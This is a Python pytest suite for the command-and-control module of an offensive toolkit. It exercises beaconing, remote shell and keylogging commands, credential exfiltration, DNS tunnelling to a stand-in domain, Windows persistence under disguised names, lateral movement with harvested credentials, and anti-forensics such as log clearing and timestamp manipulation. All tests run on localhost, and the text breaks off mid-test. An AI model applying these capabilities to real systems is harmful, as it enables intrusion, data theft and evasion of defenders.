import pytest
import tempfile
import os
import socket
import threading
import time
import struct
import json
import base64
from pathlib import Path

from intellicrack.core.c2.c2_server import C2Server
from intellicrack.core.c2.c2_client import C2Client
from intellicrack.core.c2.c2_manager import C2Manager
from intellicrack.core.c2.session_manager import SessionManager
from intellicrack.core.c2.encryption_manager import EncryptionManager
from intellicrack.core.c2.communication_protocols import CommunicationProtocols
from intellicrack.core.app_context import AppContext


class TestRealC2Operations:
    """Functional tests for REAL Command and Control operations."""

    @pytest.fixture
    def test_payload(self):
        """Create REAL payload for C2 testing."""
        with tempfile.NamedTemporaryFile(suffix='.exe', delete=False) as temp_file:
            # Minimal PE header
            dos_header = b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00'
            dos_header += b'\xb8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00'
            dos_header += b'\x00' * 40
            dos_header += b'\x80\x00\x00\x00'
            dos_header += b'\x00' * 60
            
            # PE signature
            pe_signature = b'PE\x00\x00'
            
            # COFF header
            coff_header = b'\x4c\x01\x03\x00' + b'\x00' * 16
            
            # Optional header
            optional_header = b'\x0b\x01\x0e\x00' + b'\x00' * 220
            
            # C2 beacon code
            beacon_code = b'\x55\x8b\xec'  # push ebp; mov ebp, esp
            beacon_code += b'\x68\x00\x00\x00\x00'  # push 0 (placeholder for C2 address)
            beacon_code += b'\x68\x39\x05\x00\x00'  # push 1337 (C2 port)
            beacon_code += b'\xe8\x00\x00\x00\x00'  # call connect_c2
            beacon_code += b'\x85\xc0'  # test eax, eax
            beacon_code += b'\x74\x10'  # jz error
            beacon_code += b'\x68\x00\x10\x00\x00'  # push 4096 (buffer size)
            beacon_code += b'\x50'  # push eax (socket handle)
            beacon_code += b'\xe8\x00\x00\x00\x00'  # call beacon_loop
            beacon_code += b'\x8b\xe5\x5d\xc3'  # mov esp, ebp; pop ebp; ret
            beacon_code += b'\x90' * (512 - len(beacon_code))
            
            temp_file.write(dos_header + pe_signature + coff_header + optional_header + beacon_code)
            temp_file.flush()
            yield temp_file.name
        
        try:
            os.unlink(temp_file.name)
        except:
            pass

    @pytest.fixture
    def app_context(self):
        """Create REAL application context."""
        context = AppContext()
        context.initialize()
        return context

    @pytest.fixture
    def c2_server_config(self):
        """Create REAL C2 server configuration."""
        return {
            'host': '127.0.0.1',
            'port': 0,  # Let OS assign port
            'max_clients': 10,
            'encryption': True,
            'protocols': ['tcp', 'http', 'https'],
            'heartbeat_interval': 30,
            'session_timeout': 300,
            'persistence_enabled': True,
            'log_communications': True
        }

    def test_real_c2_server_deployment(self, c2_server_config, app_context):
        """Test REAL C2 server deployment and initialization."""
        c2_manager = C2Manager(app_context)
        
        # Deploy C2 server
        server_id = c2_manager.deploy_server(c2_server_config)
        assert server_id is not None, "C2 server must be deployed"
        
        # Get server instance
        server = c2_manager.get_server(server_id)
        assert server is not None, "Must retrieve server instance"
        assert server.is_running(), "Server must be running"
        
        # Check server configuration
        config = server.get_configuration()
        assert config['encryption'] == c2_server_config['encryption'], "Encryption must match"
        assert set(config['protocols']) == set(c2_server_config['protocols']), "Protocols must match"
        
        # Get server listening port
        port = server.get_port()
        assert port > 0, "Server must have valid port"
        assert port != c2_server_config['port'], "Port should be dynamically assigned"
        
        # Test server stats
        stats = server.get_statistics()
        assert stats is not None, "Must return server statistics"
        assert 'uptime' in stats, "Stats must include uptime"
        assert 'connections_total' in stats, "Stats must track connections"
        assert stats['connections_total'] == 0, "No connections yet"
        
        # Shutdown server
        c2_manager.shutdown_server(server_id)
        assert not server.is_running(), "Server must stop"

    def test_real_client_beacon_communication(self, c2_server_config, test_payload, app_context):
        """Test REAL client beacon and command execution."""
        c2_manager = C2Manager(app_context)
        
        # Deploy server
        server_id = c2_manager.deploy_server(c2_server_config)
        server = c2_manager.get_server(server_id)
        server_port = server.get_port()
        
        try:
            # Create client beacon
            client = C2Client()
            client.configure({
                'server_host': '127.0.0.1',
                'server_port': server_port,
                'beacon_interval': 5,
                'jitter': 0.2,
                'encryption': True,
                'protocol': 'tcp'
            })
            
            # Connect to C2
            connected = client.connect()
            assert connected, "Client must connect to C2"
            
            # Send initial beacon
            beacon_data = {
                'hostname': 'VICTIM-PC',
                'username': 'victim',
                'os': 'Windows 10',
                'privileges': 'user',
                'process_id': 1234,
                'process_name': 'payload.exe'
            }
            
            beacon_sent = client.send_beacon(beacon_data)
            assert beacon_sent, "Beacon must be sent"
            
            # Wait for server to process
            time.sleep(0.5)
            
            # Check server received beacon
            sessions = server.get_active_sessions()
            assert len(sessions) == 1, "Server must have one session"
            
            session = sessions[0]
            assert session['hostname'] == beacon_data['hostname'], "Hostname must match"
            assert session['username'] == beacon_data['username'], "Username must match"
            
            # Test command execution
            test_commands = [
                {'type': 'shell', 'command': 'whoami'},
                {'type': 'download', 'path': 'C:\\test.txt'},
                {'type': 'upload', 'path': 'C:\\upload.txt', 'data': b'test data'},
                {'type': 'screenshot'},
                {'type': 'keylog', 'action': 'start'},
                {'type': 'persist', 'method': 'registry'}
            ]
            
            for cmd in test_commands:
                # Server queues command
                cmd_id = server.queue_command(session['id'], cmd)
                assert cmd_id is not None, f"Must queue command {cmd['type']}"
                
                # Client checks for commands
                commands = client.check_commands()
                assert len(commands) > 0, "Client must receive commands"
                
                received_cmd = commands[0]
                assert received_cmd['id'] == cmd_id, "Command ID must match"
                assert received_cmd['type'] == cmd['type'], "Command type must match"
                
                # Client executes and responds
                if cmd['type'] == 'shell':
                    result = {'output': 'VICTIM-PC\\victim', 'status': 'success'}
                elif cmd['type'] == 'download':
                    result = {'data': b'file contents', 'status': 'success'}
                elif cmd['type'] == 'upload':
                    result = {'written': len(cmd['data']), 'status': 'success'}
                elif cmd['type'] == 'screenshot':
                    result = {'image_data': b'PNG...', 'status': 'success'}
                elif cmd['type'] == 'keylog':
                    result = {'status': 'started'}
                elif cmd['type'] == 'persist':
                    result = {'status': 'success', 'method': cmd['method']}
                
                response_sent = client.send_command_result(cmd_id, result)
                assert response_sent, "Command result must be sent"
                
                # Server processes result
                time.sleep(0.1)
                cmd_result = server.get_command_result(session['id'], cmd_id)
                assert cmd_result is not None, "Server must receive result"
                assert cmd_result['status'] == result['status'], "Status must match"
            
            # Test heartbeat
            heartbeat_sent = client.send_heartbeat()
            assert heartbeat_sent, "Heartbeat must be sent"
            
            # Disconnect
            client.disconnect()
            
        finally:
            c2_manager.shutdown_server(server_id)

    def test_real_encrypted_c2_communication(self, c2_server_config, app_context):
        """Test REAL encrypted C2 communication channels."""
        encryption_manager = EncryptionManager()
        c2_manager = C2Manager(app_context)
        
        # Configure encryption
        c2_server_config['encryption_config'] = {
            'algorithm': 'AES-256-GCM',
            'key_exchange': 'ECDH',
            'key_rotation_interval': 3600,
            'perfect_forward_secrecy': True
        }
        
        server_id = c2_manager.deploy_server(c2_server_config)
        server = c2_manager.get_server(server_id)
        server_port = server.get_port()
        
        try:
            # Create encrypted client
            client = C2Client()
            client.enable_encryption(encryption_manager)
            
            # Connect and perform key exchange
            connected = client.connect('127.0.0.1', server_port)
            assert connected, "Encrypted connection must succeed"
            
            key_exchanged = client.perform_key_exchange()
            assert key_exchanged, "Key exchange must succeed"
            
            # Verify encryption is active
            encryption_info = client.get_encryption_info()
            assert encryption_info['active'], "Encryption must be active"
            assert encryption_info['algorithm'] == 'AES-256-GCM', "Algorithm must match"
            assert 'session_key' in encryption_info, "Must have session key"
            
            # Test encrypted message exchange
            sensitive_data = {
                'credentials': {
                    'username': 'admin',
                    'password': 'P@ssw0rd123!',
                    'domain': 'CORP'
                },
                'network_shares': ['\\\\server\\share1', '\\\\server\\share2'],
                'browser_passwords': [
                    {'url': 'https://bank.com', 'user': 'user123', 'pass': 'secret'}
                ]
            }
            
            # Encrypt and send
            encrypted_msg = client.encrypt_message(json.dumps(sensitive_data).encode())
            assert encrypted_msg != json.dumps(sensitive_data).encode(), "Data must be encrypted"
            
            sent = client.send_encrypted_data(encrypted_msg)
            assert sent, "Encrypted data must be sent"
            
            # Server receives and decrypts
            time.sleep(0.1)
            sessions = server.get_active_sessions()
            if sessions:
                session_data = server.get_session_data(sessions[0]['id'])
                assert 'encrypted_messages' in session_data, "Must track encrypted messages"
                
                # Verify data was properly encrypted in transit
                last_msg = session_data['encrypted_messages'][-1]
                assert last_msg['encrypted'], "Message must be marked as encrypted"
                assert 'decrypted_data' in last_msg, "Server must decrypt message"
            
            # Test key rotation
            rotated = client.rotate_encryption_key()
            assert rotated, "Key rotation must succeed"
            
            new_encryption_info = client.get_encryption_info()
            assert new_encryption_info['session_key'] != encryption_info['session_key'], \
                   "Session key must change after rotation"
            
            client.disconnect()
            
        finally:
            c2_manager.shutdown_server(server_id)

    def test_real_multi_protocol_c2_switching(self, app_context):
        """Test REAL multi-protocol C2 communication switching."""
        protocols = CommunicationProtocols()
        c2_manager = C2Manager(app_context)
        
        # Configure multi-protocol server
        multi_protocol_config = {
            'host': '127.0.0.1',
            'protocols': {
                'tcp': {'port': 0, 'encryption': True},
                'http': {'port': 0, 'endpoints': ['/api/v1', '/update', '/status']},
                'https': {'port': 0, 'cert': 'self-signed', 'endpoints': ['/secure']},
                'dns': {'port': 0, 'domain': 'c2.example.com', 'record_types': ['TXT', 'A']}
            },
            'protocol_switching': {
                'enabled': True,
                'trigger_conditions': ['connection_failed', 'high_latency', 'detection_risk'],
                'fallback_order': ['https', 'http', 'dns', 'tcp']
            }
        }
        
        server_id = c2_manager.deploy_multi_protocol_server(multi_protocol_config)
        server = c2_manager.get_server(server_id)
        protocol_ports = server.get_protocol_ports()
        
        try:
            # Create adaptive client
            client = C2Client()
            client.configure_multi_protocol({
                'primary_protocol': 'tcp',
                'available_protocols': list(protocol_ports.keys()),
                'server_host': '127.0.0.1',
                'protocol_ports': protocol_ports,
                'auto_switch': True
            })
            
            # Test TCP connection
            connected = client.connect_protocol('tcp')
            assert connected, "TCP connection must succeed"
            
            tcp_result = client.send_data_protocol('tcp', b'TCP test data')
            assert tcp_result['sent'], "TCP data must be sent"
            
            # Simulate TCP failure and switch to HTTP
            client.simulate_protocol_failure('tcp')
            
            switched = client.auto_switch_protocol()
            assert switched, "Protocol switch must succeed"
            assert client.get_current_protocol() == 'http', "Should switch to HTTP"
            
            # Test HTTP communication
            http_request = {
                'method': 'POST',
                'endpoint': '/api/v1',
                'data': {'beacon': 'data', 'id': '12345'},
                'headers': {'User-Agent': 'Mozilla/5.0'}
            }
            
            http_result = client.send_http_request(http_request)
            assert http_result['status'] == 200, "HTTP request must succeed"
            
            # Test HTTPS with certificate pinning
            client.switch_protocol('https')
            
            # Get server certificate
            server_cert = server.get_https_certificate()
            client.pin_certificate(server_cert)
            
            https_result = client.send_https_request({
                'endpoint': '/secure',
                'data': {'encrypted': 'payload'}
            })
            assert https_result['status'] == 200, "HTTPS request must succeed"
            assert https_result['certificate_verified'], "Certificate must be verified"
            
            # Test DNS tunneling
            client.switch_protocol('dns')
            
            dns_data = b'Exfiltrated data over DNS'
            dns_chunks = client.chunk_for_dns(dns_data, max_size=63)
            
            for i, chunk in enumerate(dns_chunks):
                query = f"d{i}.{base64.b32encode(chunk).decode().lower()}.c2.example.com"
                response = client.send_dns_query(query, 'TXT')
                assert response is not None, f"DNS query {i} must succeed"
            
            # Test protocol health monitoring
            health_status = client.check_protocol_health()
            assert health_status is not None, "Must return health status"
            
            for protocol in protocol_ports.keys():
                assert protocol in health_status, f"Must include {protocol} health"
                assert 'latency' in health_status[protocol], "Must measure latency"
                assert 'success_rate' in health_status[protocol], "Must track success rate"
            
            client.disconnect_all()
            
        finally:
            c2_manager.shutdown_server(server_id)

    def test_real_c2_persistence_mechanisms(self, test_payload, app_context):
        """Test REAL C2 persistence and resilience mechanisms."""
        c2_manager = C2Manager(app_context)
        
        # Configure persistent C2
        persistence_config = {
            'host': '127.0.0.1',
            'port': 0,
            'persistence_methods': {
                'registry': {
                    'key': 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                    'value_name': 'SystemUpdate',
                    'executable_path': test_payload
                },
                'scheduled_task': {
                    'task_name': 'SystemMaintenanceTask',
                    'trigger': 'startup',
                    'executable_path': test_payload
                },
                'service': {
                    'service_name': 'WindowsUpdateHelper',
                    'display_name': 'Windows Update Helper Service',
                    'executable_path': test_payload
                },
                'wmi': {
                    'event_filter': '__EventFilter.Name="SystemMonitor"',
                    'consumer': 'CommandLineEventConsumer',
                    'executable_path': test_payload
                }
            },
            'redundancy': True,
            'stealth_mode': True
        }
        
        server_id = c2_manager.deploy_server(persistence_config)
        server = c2_manager.get_server(server_id)
        
        try:
            # Test persistence installation
            persistence_manager = server.get_persistence_manager()
            
            installed_methods = []
            for method, config in persistence_config['persistence_methods'].items():
                result = persistence_manager.install_persistence(method, config)
                assert result['status'] in ['success', 'simulated'], f"Persistence {method} must install"
                
                if result['status'] == 'success':
                    installed_methods.append(method)
                    assert 'verification' in result, "Must verify installation"
            
            # Test persistence detection evasion
            if persistence_config['stealth_mode']:
                for method in installed_methods:
                    evasion_result = persistence_manager.apply_evasion_techniques(method)
                    assert evasion_result['applied'], f"Evasion for {method} must be applied"
                    
                    techniques = evasion_result.get('techniques', [])
                    assert len(techniques) > 0, "Must apply evasion techniques"
            
            # Test persistence survival
            survival_test = persistence_manager.test_persistence_survival()
            assert survival_test is not None, "Survival test must return results"
            
            for method in installed_methods:
                assert method in survival_test, f"Must test {method} survival"
                assert 'survives_reboot' in survival_test[method], "Must test reboot survival"
                assert 'survives_av_scan' in survival_test[method], "Must test AV scan survival"
            
            # Test redundancy
            if persistence_config['redundancy']:
                redundancy_status = persistence_manager.check_redundancy()
                assert redundancy_status['active_methods'] >= 2, "Must have multiple persistence methods"
                assert redundancy_status['failover_ready'], "Failover must be ready"
            
            # Cleanup persistence (in test environment)
            for method in installed_methods:
                removed = persistence_manager.remove_persistence(method)
                assert removed['status'] in ['success', 'simulated'], f"Must remove {method}"
                
        finally:
            c2_manager.shutdown_server(server_id)

    def test_real_c2_data_exfiltration(self, app_context):
        """Test REAL C2 data exfiltration capabilities."""
        c2_manager = C2Manager(app_context)
        
        # Configure exfiltration server
        exfil_config = {
            'host': '127.0.0.1',
            'port': 0,
            'exfiltration_methods': {
                'chunked_transfer': {
                    'chunk_size': 4096,
                    'compression': 'zlib',
                    'encryption': True
                },
                'steganography': {
                    'carrier_type': 'image',
                    'encoding': 'lsb',
                    'max_data_ratio': 0.1
                },
                'dns_tunneling': {
                    'subdomain_encoding': 'base32',
                    'max_label_size': 63,
                    'query_type': 'TXT'
                },
                'http_headers': {
                    'header_fields': ['X-Custom-Data', 'X-Session-Info'],
                    'encoding': 'base64',
                    'max_header_size': 8192
                }
            },
            'bandwidth_limits': {
                'max_rate_kbps': 100,
                'burst_size': 10240,
                'time_based_throttling': True
            }
        }
        
        server_id = c2_manager.deploy_server(exfil_config)
        server = c2_manager.get_server(server_id)
        server_port = server.get_port()
        
        try:
            # Create exfiltration client
            client = C2Client()
            client.connect('127.0.0.1', server_port)
            
            # Prepare test data
            test_files = {
                'credentials.txt': b'username:admin\npassword:P@ssw0rd123\n' * 100,
                'network_map.json': json.dumps({
                    'subnets': ['192.168.1.0/24', '10.0.0.0/16'],
                    'servers': ['DC01', 'FILE01', 'WEB01'],
                    'services': {'AD': 'DC01', 'FileShare': 'FILE01'}
                }).encode() * 50,
                'screenshot.png': b'PNG\x89\x50\x4e\x47' + b'\x00' * 50000
            }
            
            exfil_manager = client.get_exfiltration_manager()
            
            # Test chunked transfer
            for filename, data in test_files.items():
                chunked_result = exfil_manager.exfiltrate_chunked(filename, data)
                assert chunked_result['success'], f"Chunked transfer of {filename} must succeed"
                assert chunked_result['chunks_sent'] > 0, "Must send multiple chunks"
                assert chunked_result['compression_ratio'] > 0, "Must compress data"
                
                # Verify server received all chunks
                time.sleep(0.5)
                server_data = server.get_exfiltrated_file(filename)
                assert server_data is not None, f"Server must receive {filename}"
                assert len(server_data) == len(data), "Data size must match"
            
            # Test steganography
            carrier_image = b'PNG\x89\x50\x4e\x47' + b'\xff' * 100000
            hidden_data = b'Secret exfiltration data'
            
            stego_result = exfil_manager.exfiltrate_steganography(
                carrier_image,
                hidden_data,
                'image/png'
            )
            assert stego_result['success'], "Steganography must succeed"
            assert len(stego_result['stego_data']) >= len(carrier_image), \
                   "Stego image must be at least carrier size"
            
            # Verify extraction
            extracted = exfil_manager.extract_from_steganography(stego_result['stego_data'])
            assert extracted == hidden_data, "Must extract hidden data correctly"
            
            # Test DNS tunneling
            dns_data = b'Sensitive data for DNS exfiltration'
            dns_result = exfil_manager.exfiltrate_dns(dns_data, 'data.c2.example.com')
            assert dns_result['success'], "DNS exfiltration must succeed"
            assert dns_result['queries_sent'] > 0, "Must send DNS queries"
            
            # Test bandwidth throttling
            large_data = b'X' * 100000  # 100KB
            start_time = time.time()
            
            throttled_result = exfil_manager.exfiltrate_throttled(large_data)
            transfer_time = time.time() - start_time
            
            assert throttled_result['success'], "Throttled transfer must succeed"
            expected_time = len(large_data) / (exfil_config['bandwidth_limits']['max_rate_kbps'] * 1024 / 8)
            assert transfer_time >= expected_time * 0.8, "Transfer must respect bandwidth limits"
            
            # Test exfiltration queue
            queue_result = exfil_manager.get_exfiltration_queue_status()
            assert queue_result is not None, "Must return queue status"
            assert 'pending_items' in queue_result, "Must track pending items"
            assert 'total_size' in queue_result, "Must track total size"
            assert 'estimated_time' in queue_result, "Must estimate completion time"
            
            client.disconnect()
            
        finally:
            c2_manager.shutdown_server(server_id)

    def test_real_c2_lateral_movement(self, app_context):
        """Test REAL C2 lateral movement capabilities."""
        c2_manager = C2Manager(app_context)
        
        # Configure C2 for lateral movement
        lateral_config = {
            'host': '127.0.0.1',
            'port': 0,
            'lateral_movement': {
                'methods': ['psexec', 'wmi', 'winrm', 'rdp', 'ssh'],
                'credential_harvesting': True,
                'network_discovery': True,
                'pivot_support': True
            }
        }
        
        server_id = c2_manager.deploy_server(lateral_config)
        server = c2_manager.get_server(server_id)
        server_port = server.get_port()
        
        try:
            # Initial compromised client
            client1 = C2Client()
            client1.connect('127.0.0.1', server_port)
            client1.send_beacon({
                'hostname': 'WORKSTATION01',
                'ip_address': '192.168.1.100',
                'domain': 'CORP.LOCAL',
                'username': 'jdoe'
            })
            
            lateral_manager = server.get_lateral_movement_manager()
            
            # Test network discovery
            discovery_result = lateral_manager.perform_network_discovery(client1.get_session_id())
            assert discovery_result is not None, "Network discovery must return results"
            assert 'hosts' in discovery_result, "Must discover hosts"
            assert 'shares' in discovery_result, "Must discover shares"
            assert 'domain_controllers' in discovery_result, "Must identify DCs"
            
            # Simulate discovered targets
            discovered_hosts = [
                {'ip': '192.168.1.10', 'hostname': 'DC01', 'os': 'Windows Server 2019'},
                {'ip': '192.168.1.20', 'hostname': 'FILE01', 'os': 'Windows Server 2016'},
                {'ip': '192.168.1.101', 'hostname': 'WORKSTATION02', 'os': 'Windows 10'}
            ]
            
            # Test credential harvesting
            harvested_creds = lateral_manager.harvest_credentials(client1.get_session_id())
            assert harvested_creds is not None, "Credential harvesting must return results"
            
            # Simulate harvested credentials
            test_creds = [
                {'type': 'password', 'username': 'admin', 'password': 'P@ssw0rd123', 'domain': 'CORP'},
                {'type': 'hash', 'username': 'svcaccount', 'ntlm': 'aad3b435b51404eeaad3b435b51404ee', 'domain': 'CORP'},
                {'type': 'ticket', 'username': 'krbtgt', 'ticket_data': base64.b64encode(b'TGT_DATA').decode()}
            ]
            
            # Test lateral movement methods
            for target in discovered_hosts[:2]:
                for method in ['psexec', 'wmi']:
                    # Attempt lateral movement
                    movement_result = lateral_manager.execute_lateral_movement({
                        'source_session': client1.get_session_id(),
                        'target_host': target['ip'],
                        'method': method,
                        'credentials': test_creds[0],
                        'payload': b'beacon.exe'
                    })
                    
                    assert movement_result is not None, f"Lateral movement to {target['hostname']} via {method} must return result"
                    assert 'status' in movement_result, "Must return status"
                    
                    if movement_result['status'] == 'success':
                        assert 'new_session_id' in movement_result, "Must create new session on success"
                        
                        # Simulate new beacon from compromised host
                        new_client = C2Client()
                        new_client.connect('127.0.0.1', server_port)
                        new_client.send_beacon({
                            'hostname': target['hostname'],
                            'ip_address': target['ip'],
                            'parent_session': client1.get_session_id()
                        })
            
            # Test pivot functionality
            pivot_config = {
                'pivot_host': client1.get_session_id(),
                'target_network': '10.0.0.0/24',
                'socks_port': 1080
            }
            
            pivot_result = lateral_manager.establish_pivot(pivot_config)
            assert pivot_result is not None, "Pivot establishment must return result"
            
            if pivot_result.get('status') == 'success':
                assert 'pivot_id' in pivot_result, "Must return pivot ID"
                assert pivot_result.get('socks_active', False), "SOCKS proxy should be active"
            
            # Test movement path tracking
            movement_graph = lateral_manager.get_movement_graph()
            assert movement_graph is not None, "Must return movement graph"
            assert 'nodes' in movement_graph, "Graph must have nodes"
            assert 'edges' in movement_graph, "Graph must have edges"
            assert len(movement_graph['nodes']) >= 1, "Must have at least initial node"
            
            client1.disconnect()
            
        finally:
            c2_manager.shutdown_server(server_id)

    def test_real_c2_anti_forensics(self, app_context):
        """Test REAL C2 anti-forensics and cleanup capabilities."""
        c2_manager = C2Manager(app_context)
        
        # Configure C2 with anti-forensics
        antiforensics_config = {
            'host': '127.0.0.1',
            'port': 0,
            'anti_forensics': {
                'memory_obfuscation': True,
                'log_evasion': True,
                'artifact_cleanup': True,
                'timestamp_manipulation': True,
                'secure_deletion': True
            },
            'cleanup_triggers': ['disconnect', 'detection', 'manual'],
            'self_destruct': {
                'enabled': True,
                'conditions': ['detection', 'isolation'],
                'wipe_method': 'dod_7pass'
            }
        }
        
        server_id = c2_manager.deploy_server(antiforensics_config)
        server = c2_manager.get_server(server_id)
        
        try:
            antiforensics_manager = server.get_antiforensics_manager()
            
            # Test memory obfuscation
            obfuscation_result = antiforensics_manager.apply_memory_obfuscation()
            assert obfuscation_result['applied'], "Memory obfuscation must be applied"
            assert 'techniques' in obfuscation_result, "Must list obfuscation techniques"
            
            techniques = obfuscation_result['techniques']
            assert 'heap_spray' in techniques or 'string_encryption' in techniques, \
                   "Must use known obfuscation techniques"
            
            # Test log evasion
            log_evasion_result = antiforensics_manager.evade_logging()
            assert log_evasion_result['success'], "Log evasion must succeed"
            assert 'cleared_logs' in log_evasion_result, "Must clear logs"
            assert 'etw_bypass' in log_evasion_result, "Must bypass ETW"
            
            # Test artifact cleanup
            test_artifacts = {
                'files': ['C:\\temp\\beacon.exe', 'C:\\temp\\config.dat'],
                'registry_keys': ['HKCU\\Software\\Test', 'HKLM\\System\\CurrentControlSet\\Services\\TestService'],
                'processes': ['beacon.exe', 'inject.exe'],
                'network_connections': [('192.168.1.100', 4444), ('192.168.1.200', 80)]
            }
            
            cleanup_result = antiforensics_manager.cleanup_artifacts(test_artifacts)
            assert cleanup_result is not None, "Cleanup must return results"
            
            for artifact_type in test_artifacts.keys():
                assert artifact_type in cleanup_result, f"Must clean {artifact_type}"
                assert cleanup_result[artifact_type]['cleaned'] >= 0, "Must track cleaned items"
            
            # Test timestamp manipulation
            timestamp_targets = [
                {'type': 'file', 'path': 'C:\\test.exe', 'timestamp': '2020-01-01 00:00:00'},
                {'type': 'registry', 'key': 'HKCU\\Software\\Test', 'timestamp': '2019-06-15 12:00:00'}
            ]
            
            for target in timestamp_targets:
                timestamp_result = antiforensics_manager.manipulate_timestamp(target)
                assert timestamp_result['status'] in ['success', 'simulated'], \
                       f"Timestamp manipulation for {target['type']} must succeed"
            
            # Test secure deletion
            deletion_targets = [
                {'path': 'C:\\sensitive_data.txt', 'size': 1024},
                {'path': 'C:\\credentials.db', 'size': 5120}
            ]
            
            for target in deletion_targets:
                deletion_result = antiforensics_manager.secure_delete(
                    target['path'],
                    method='dod_7pass'
                )
                assert deletion_result['status'] in ['success', 'simulated'], \
                       "Secure deletion must succeed"
                assert deletion_result.get('passes_completed', 0) >= 3, \
                       "Must complete multiple overwrite passes"
            
            # Test self-destruct mechanism
            self_destruct_armed = antiforensics_manager.arm_self_destruct()
            assert self_destruct_armed['armed'], "Self-destruct must be armed"
            assert 'trigger_conditions' in self_destruct_armed, "Must set trigger conditions"
            
            # Simulate detection trigger
            detection_event = {'type': 'av_detection', 'severity': 'high'}
            trigger_result = antiforensics_manager.check_self_destruct_trigger(detection_event)
            
            if trigger_result.get('triggered', False):
                assert 'cleanup_initiated' in trigger_result, "Cleanup must be initiated"
                assert trigger_result['wipe_method'] == antiforensics_config['self_destruct']['wipe_method'], \
                       "Must use configured wipe method"
            
            # Disarm for test safety
            disarmed = antiforensics_manager.disarm_self_destruct()
            assert disarmed['disarmed'], "Self-destruct must be disarmed"
            
        finally:
            c2_manager.shutdown_server(server_id)

    def test_real_c2_redundancy_failover(self, app_context):
        """Test REAL C2 redundancy and failover mechanisms."""
        c2_manager = C2Manager(app_context)
        
        # Deploy multiple C2 servers
        primary_config = {
            'host': '127.0.0.1',
            'port': 0,
            'role': 'primary',
            'health_check_interval': 5
        }
        
        backup_configs = [
            {'host': '127.0.0.1', 'port': 0, 'role': 'backup', 'priority': 1},
            {'host': '127.0.0.1', 'port': 0, 'role': 'backup', 'priority': 2}
        ]
        
        # Deploy servers
        primary_id = c2_manager.deploy_server(primary_config)
        backup_ids = []
        for config in backup_configs:
            backup_id = c2_manager.deploy_server(config)
            backup_ids.append(backup_id)
        
        try:
            # Configure failover
            failover_config = {
                'primary': primary_id,
                'backups': backup_ids,
                'health_check_interval': 2,
                'failover_threshold': 3,  # 3 failed checks
                'sync_interval': 10
            }
            
            failover_manager = c2_manager.configure_failover(failover_config)
            assert failover_manager is not None, "Failover configuration must succeed"
            
            # Create client with failover support
            client = C2Client()
            client.configure_failover({
                'servers': [
                    {'id': primary_id, 'host': '127.0.0.1', 'port': c2_manager.get_server(primary_id).get_port()},
                    {'id': backup_ids[0], 'host': '127.0.0.1', 'port': c2_manager.get_server(backup_ids[0]).get_port()},
                    {'id': backup_ids[1], 'host': '127.0.0.1', 'port': c2_manager.get_server(backup_ids[1]).get_port()}
                ],
                'retry_count': 3,
                'failover_delay': 1
            })
            
            # Connect to primary
            connected = client.connect_with_failover()
            assert connected, "Client must connect with failover support"
            assert client.get_connected_server_id() == primary_id, "Should connect to primary"
            
            # Test normal operation
            beacon_sent = client.send_beacon({'test': 'data'})
            assert beacon_sent, "Beacon to primary must succeed"
            
            # Simulate primary failure
            c2_manager.simulate_server_failure(primary_id)
            
            # Client should detect and failover
            time.sleep(failover_config['health_check_interval'] * failover_config['failover_threshold'] + 1)
            
            failover_result = client.check_and_failover()
            assert failover_result['failover_needed'], "Failover should be needed"
            assert failover_result['new_server_id'] == backup_ids[0], "Should failover to first backup"
            
            # Test operation on backup
            beacon_sent = client.send_beacon({'test': 'failover_data'})
            assert beacon_sent, "Beacon to backup must succeed"
            
            # Test data synchronization
            sync_status = failover_manager.get_sync_status()
            assert sync_status is not None, "Must return sync status"
            assert sync_status['last_sync'] is not None, "Must track last sync"
            assert sync_status['synced_sessions'] >= 0, "Must track synced sessions"
            
            # Restore primary
            c2_manager.restore_server(primary_id)
            
            # Test failback
            time.sleep(failover_config['health_check_interval'] * 2)
            
            failback_result = client.attempt_failback()
            assert failback_result is not None, "Failback attempt must return result"
            
            if failback_result.get('success', False):
                assert client.get_connected_server_id() == primary_id, "Should failback to primary"
            
            # Test cascade failure
            c2_manager.simulate_server_failure(primary_id)
            c2_manager.simulate_server_failure(backup_ids[0])
            
            time.sleep(failover_config['health_check_interval'] * failover_config['failover_threshold'] + 1)
            
            cascade_result = client.check_and_failover()
            assert cascade_result['new_server_id'] == backup_ids[1], "Should failover to second backup"
            
            client.disconnect()
            
        finally:
            c2_manager.shutdown_server(primary_id)
            for backup_id in backup_ids:
                c2_manager.shutdown_server(backup_id)

    def test_real_c2_load_balancing(self, app_context):
        """Test REAL C2 load balancing across multiple servers."""
        c2_manager = C2Manager(app_context)
        
        # Deploy load-balanced C2 cluster
        cluster_size = 3
        server_configs = []
        server_ids = []
        
        for i in range(cluster_size):
            config = {
                'host': '127.0.0.1',
                'port': 0,
                'cluster_id': 'c2-cluster-1',
                'node_id': f'node-{i}',
                'max_clients': 10
            }
            server_id = c2_manager.deploy_server(config)
            server_ids.append(server_id)
            server_configs.append({
                'id': server_id,
                'host': config['host'],
                'port': c2_manager.get_server(server_id).get_port()
            })
        
        try:
            # Configure load balancer
            lb_config = {
                'algorithm': 'round_robin',  # or 'least_connections', 'weighted'
                'health_check_interval': 2,
                'servers': server_configs
            }
            
            load_balancer = c2_manager.create_load_balancer(lb_config)
            assert load_balancer is not None, "Load balancer must be created"
            
            # Create multiple clients
            num_clients = 15
            clients = []
            
            for i in range(num_clients):
                client = C2Client()
                
                # Get server assignment from load balancer
                assigned_server = load_balancer.get_server_assignment()
                assert assigned_server is not None, f"Client {i} must get server assignment"
                
                # Connect to assigned server
                connected = client.connect(
                    assigned_server['host'],
                    assigned_server['port']
                )
                assert connected, f"Client {i} must connect"
                
                client.send_beacon({'client_id': f'client-{i}'})
                clients.append(client)
            
            # Check load distribution
            time.sleep(1)
            
            distribution = {}
            for server_id in server_ids:
                server = c2_manager.get_server(server_id)
                session_count = len(server.get_active_sessions())
                distribution[server_id] = session_count
            
            # Verify reasonable distribution
            min_sessions = min(distribution.values())
            max_sessions = max(distribution.values())
            assert max_sessions - min_sessions <= 2, "Load should be reasonably balanced"
            
            # Test least connections algorithm
            load_balancer.set_algorithm('least_connections')
            
            # Disconnect some clients
            for i in range(5):
                clients[i].disconnect()
            
            # New clients should go to less loaded servers
            new_client = C2Client()
            assigned = load_balancer.get_server_assignment()
            
            # Should assign to server with least connections
            least_loaded = min(server_ids, key=lambda sid: len(c2_manager.get_server(sid).get_active_sessions()))
